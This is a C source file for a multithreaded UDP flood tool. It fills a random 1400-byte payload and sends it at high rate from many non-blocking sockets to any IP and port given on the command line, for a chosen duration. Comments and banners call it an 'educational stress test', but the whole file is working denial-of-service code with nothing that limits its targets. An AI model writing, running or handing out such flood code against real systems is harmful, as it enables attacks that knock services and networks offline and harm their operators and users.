#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>

// github.com/scallydima - high performance udp flood
// github.com/scallydima - optimized for maximum packets per second
// github.com/scallydima - demonstrates network stress testing

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int socket_count;
    int packet_size;
} perf_params;

char *g_payload = NULL;
int g_payload_size = 0;

void *perf_flood(void *arg) {
    perf_params *params = (perf_params *)arg;
    int sockets[params->socket_count];
    for (int i = 0; i < params->socket_count; i++) {
        sockets[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        fcntl(sockets[i], F_SETFL, O_NONBLOCK);
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(params->target_port);
    addr.sin_addr.s_addr = inet_addr(params->target_ip);
    
    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time) {
        for (int i = 0; i < params->socket_count; i++) {
            sendto(sockets[i], g_payload, g_payload_size, 0,
                   (struct sockaddr *)&addr, sizeof(addr));
        }
    }
    
    for (int i = 0; i < params->socket_count; i++) {
        close(sockets[i]);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS> <SOCKETS_PER_THREAD>\n", argv[0]);
        printf("github.com/scallydima - performance testing tool\n");
        return 1;
    }
    
    srand(time(NULL));
    g_payload_size = 1400; // size
    g_payload = malloc(g_payload_size);
    for (int i = 0; i < g_payload_size; i++) {
        g_payload[i] = rand() % 256;
    }
    
    perf_params params = {
        .target_port = atoi(argv[2]),
        .duration = atoi(argv[3]),
        .socket_count = atoi(argv[5]),
        .packet_size = g_payload_size
    };
    strcpy(params.target_ip, argv[1]);
    
    int threads_count = atoi(argv[4]);
    pthread_t threads[threads_count];
    
    printf("[+] High-performance UDP flood started\n");
    printf("[+] Target: %s:%d\n", params.target_ip, params.target_port);
    printf("[+] Duration: %d seconds\n", params.duration);
    printf("[+] Threads: %d, Sockets per thread: %d\n", 
           threads_count, params.socket_count);
    printf("[+] Total sockets: %d\n", threads_count * params.socket_count);
    printf("[+] github.com/scallydima - educational stress test\n");
    
    for (int i = 0; i < threads_count; i++) {
        pthread_create(&threads[i], NULL, perf_flood, &params);
    }
    
    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(g_payload);
    printf("[+] Test complete - github.com/scallydima\n");
    
    return 0;

}
